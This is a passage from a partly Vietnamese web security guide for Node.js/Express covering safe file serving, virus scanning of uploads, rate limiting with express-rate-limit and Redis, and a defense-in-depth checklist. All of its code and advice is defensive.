// ✅ SAFE - Files outside web root
const UPLOAD_DIR = '/var/app/user-uploads'; // Not served directly

// Serve via controlled endpoint
app.get('/files/:id', async (req, res) => {
  const file = await getFileMetadata(req.params.id);
  
  // Authorization check
  if (file.ownerId !== req.user.id) {
    return res.status(403).send('Forbidden');
  }
  
  // Set Content-Disposition to prevent execution
  res.setHeader('Content-Type', file.mimeType);
  res.setHeader('Content-Disposition', 'attachment');
  res.sendFile(path.join(UPLOAD_DIR, file.filename));
});
```

---

### Prevention Strategy 5: Virus Scanning

```javascript
const NodeClam = require('clamscan');

const clamscan = await new NodeClam().init({
  clamdscan: {
    host: 'localhost',
    port: 3310
  }
});

app.post('/upload', upload.single('file'), async (req, res) => {
  const filePath = req.file.path;
  
  // Scan for viruses
  const { isInfected, viruses } = await clamscan.isInfected(filePath);
  
  if (isInfected) {
    // Delete infected file
    fs.unlinkSync(filePath);
    
    return res.status(400).json({
      error: 'File contains malware',
      viruses
    });
  }
  
  // Safe to proceed
  res.json({ success: true });
});
```

---

### File Upload Security Checklist

**Validation:**
- ☐ Check file type (magic number, not just MIME)
- ☐ Enforce file size limits
- ☐ Whitelist allowed extensions
- ☐ Sanitize filenames (no path traversal)

**Storage:**
- ☐ Store outside web root
- ☐ Use random filenames (don't trust user input)
- ☐ Separate storage per user (isolation)
- ☐ Implement quotas (prevent disk fill)

**Serving:**
- ☐ Authorization check before serving
- ☐ Set `Content-Disposition: attachment`
- ☐ Never execute uploaded files
- ☐ Scan for viruses (if possible)

**Monitoring:**
- ☐ Log all uploads (who, what, when)
- ☐ Alert on suspicious patterns
- ☐ Regular storage audits

---

## 10. Rate Limiting

### Concept

**Core idea**: Limit number of requests per time window to prevent abuse.

**Mental model**: Speed limit
```
Normal traffic = Cars at safe speed
Attacker = Speeding car
Rate limiting = Speed cameras + automatic tickets
```

---

### Why rate limiting is critical

**Attack scenarios prevented:**
```
1. Brute force login (1000s of password attempts)
2. Credential stuffing (automated login attempts)
3. DDoS (overwhelm server)
4. Data scraping (automated data extraction)
5. API abuse (exhaust resources)
```

---

### Implementation: express-rate-limit

```javascript
const rateLimit = require('express-rate-limit');

// Global rate limiter
const globalLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // 100 requests per window
  message: 'Too many requests, please try again later',
  standardHeaders: true, // Return rate limit info in headers
  legacyHeaders: false
});

app.use(globalLimiter); // Apply to all routes
```

---

### Tiered Rate Limiting (Different limits for different endpoints)

```javascript
// Strict limiter for authentication
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // Only 5 attempts
  skipSuccessfulRequests: true, // Don't count successful logins
  message: 'Too many login attempts'
});

// Moderate limiter for API
const apiLimiter = rateLimit({
  windowMs: 1 * 60 * 1000, // 1 minute
  max: 60 // 60 requests per minute
});

// Lenient for static assets
const staticLimiter = rateLimit({
  windowMs: 1 * 60 * 1000,
  max: 1000 // High limit
});

// Apply different limiters
app.post('/api/auth/login', authLimiter, loginHandler);
app.use('/api/', apiLimiter);
app.use('/static/', staticLimiter);
```

---

### Advanced: User-based Rate Limiting

```javascript
// Different limits for authenticated vs anonymous
const dynamicLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: (req) => {
    // Authenticated users get higher limit
    if (req.user) {
      return 200;
    }
    // Anonymous users get lower limit
    return 50;
  },
  keyGenerator: (req) => {
    // Rate limit by user ID if authenticated, IP if not
    return req.user ? req.user.id : req.ip;
  }
});
```

---

### Rate Limiting with Redis (Production-scale)

```javascript
const RedisStore = require('rate-limit-redis');
const redis = require('redis');

const redisClient = redis.createClient({
  host: 'localhost',
  port: 6379
});

const limiter = rateLimit({
  store: new RedisStore({
    client: redisClient,
    prefix: 'rl:' // Rate limit key prefix
  }),
  windowMs: 15 * 60 * 1000,
  max: 100
});

// Benefits:
// - Shared state across multiple servers
// - Persistent (survives server restart)
// - Fast (in-memory)
```

---

### Rate Limit Headers

```javascript
// Client receives headers:
X-RateLimit-Limit: 100          // Max requests per window
X-RateLimit-Remaining: 87        // Requests left
X-RateLimit-Reset: 1640000000    // When limit resets (Unix timestamp)

// Client can use these to:
// - Display warning to user
// - Implement client-side throttling
// - Retry after reset time
```

---

### Rate Limiting Best Practices

**Do:**
- ☐ Different limits for different endpoints (auth vs API vs static)
- ☐ Higher limits for authenticated users
- ☐ Use Redis for multi-server deployments
- ☐ Return clear error messages với retry-after info
- ☐ Monitor rate limit hits (detect attacks)

**Don't:**
- ☐ Use same limit for all endpoints (too restrictive or too lenient)
- ☐ Rate limit health checks (breaks monitoring)
- ☐ Set limits too low (frustrate legitimate users)
- ☐ Forget to handle limit exceeded errors (504 Gateway Timeout)

---

### Monitoring Rate Limits

```javascript
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  handler: (req, res) => {
    // Log rate limit violations
    logger.warn('Rate limit exceeded', {
      ip: req.ip,
      path: req.path,
      user: req.user?.id
    });
    
    res.status(429).json({
      error: 'Too many requests',
      retryAfter: req.rateLimit.resetTime
    });
  }
});
```

---

## Tổng kết: Defense in Depth Strategy

### Layered Security Model

```
Layer 1: Input Sanitization
→ Remove malicious content at entry

Layer 2: Output Encoding
→ Escape dangerous chars at display

Layer 3: CSP
→ Block execution even if XSS gets through

Layer 4: HTTPS + HSTS
→ Encrypted transport, no eavesdropping

Layer 5: Secure Cookies (HttpOnly + SameSite)
→ Protect session tokens

Layer 6: CORS
→ Control cross-origin access
```

---

### Quick Reference: Which technique for which attack?

| Attack | Primary Defense | Secondary Defense |
|--------|----------------|-------------------|
| **XSS** | Input sanitization + Output encoding | CSP |
| **CSRF** | SameSite cookies | CSRF tokens |
| **Session Hijacking** | HttpOnly cookies | HTTPS + HSTS |
| **Clickjacking** | X-Frame-Options / CSP frame-ancestors | - |
| **MITM** | HTTPS + HSTS | Certificate pinning |
| **Data Exfiltration** | CORS + CSP connect-src | Authentication |

---

### Priority checklist for new project

```
Day 1: Must-haves
□ HTTPS everywhere (redirect HTTP → HTTPS)
□ HSTS header
□ Secure + HttpOnly + SameSite cookies
□ Framework auto-escaping (React/Vue/Angular)

Week 1: Important
□ CSP policy (start Report-Only, then enforce)
□ CORS configuration (whitelist, not *)
□ Input validation on all endpoints

Month 1: Advanced
□ DOMPurify for rich text
□ Nonce-based CSP
□ Regular security audits
□ Dependency scanning (Snyk, npm audit)
```

---

**Final Advice**:
> Security không phải one-time setup, là **continuous process**. Start với fundamentals (HTTPS, secure cookies, framework defaults). Add layers gradually (CSP, CORS). Review regularly (new vulnerabilities, dependency updates). When in doubt, **default to most restrictive**, relax only khi có clear business need. Remember: **It's easier to loosen security than explain a breach**.